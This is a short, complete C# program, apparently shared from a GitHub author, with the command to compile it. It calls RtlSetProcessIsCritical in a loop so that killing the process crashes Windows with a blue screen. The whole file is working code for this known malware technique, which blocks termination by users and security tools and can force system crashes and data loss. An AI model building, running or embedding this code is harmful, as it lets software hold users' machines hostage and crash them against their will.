// made by https://github.com/chainski
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /preferreduilang:en-US /out:bsod.exe /target:exe bsod.cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace NTRaiseHardError
{
    public class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        public static void Main()
        {
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine("[+] RtlSetProcessIsCritical is ENABLED, terminating this process will result in a BSOD");
            while (true)
            {
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
                Thread.Sleep(5000); 
            }
        }
    }
}